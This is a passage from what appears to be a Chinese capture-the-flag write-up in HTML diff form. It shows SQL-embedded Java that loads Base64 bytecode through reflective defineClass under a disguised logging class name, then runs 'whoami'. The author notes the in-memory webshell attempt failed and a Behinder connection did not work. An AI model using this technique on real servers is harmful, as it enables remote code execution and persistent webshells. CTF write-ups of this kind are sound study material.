+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">ClassLoader</span><span class="w"> </span><span class="n">classLoader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">Thread</span><span class="p">.</span><span class="n">currentThread</span><span class="p">().</span><span class="n">getContextClassLoader</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">reflect</span><span class="p">.</span><span class="k">Method</span><span class="w"> </span><span class="n">defineClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="n">ClassLoader</span><span class="p">.</span><span class="k">class</span><span class="p">.</span><span class="n">getDeclaredMethod</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="s2">&#34;defineClass&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="k">class</span><span class="p">,</span><span class="w"> </span><span class="n">byte</span><span class="p">[].</span><span class="k">class</span><span class="p">,</span><span class="w"> </span><span class="nb">int</span><span class="p">.</span><span class="k">class</span><span class="p">,</span><span class="w"> </span><span class="nb">int</span><span class="p">.</span><span class="k">class</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">defineClass</span><span class="p">.</span><span class="n">setAccessible</span><span class="p">(</span><span class="k">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">byte</span><span class="p">[]</span><span class="w"> </span><span class="n">bytecode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">java</span><span class="p">.</span><span class="n">util</span><span class="p">.</span><span class="n">Base64</span><span class="p">.</span><span class="n">getDecoder</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="n">tomcatStr</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="k">Class</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="n">lang</span><span class="p">.</span><span class="k">Class</span><span class="p">)</span><span class="w"> </span><span class="n">defineClass</span><span class="p">.</span><span class="n">invoke</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">classLoader</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;org.apache.logging.oy.EncryptionUtils&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">bytecode</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">bytecode</span><span class="p">.</span><span class="k">length</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">clazz</span><span class="p">.</span><span class="n">newInstance</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="s2">&#34;test&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">$$</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">CALL</span><span class="w"> </span><span class="n">AQWSSSAB</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>结果还是不行</p>
+<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81wp/image-20251127235558930.png"
+	width="1859"
+	height="485"
+	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81wp/image-20251127235558930_hu16292217491735307378.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81wp/image-20251127235558930_hu10959795737566277676.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251127235558930"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="383"
+		data-flex-basis="919px"
+	
+></p>
+<p>可以看到前面的sql文件都成功写入了，但是这里函数执行返回了null,内存马没打成功，冰蝎也连不上</p>
 
 </section>
 
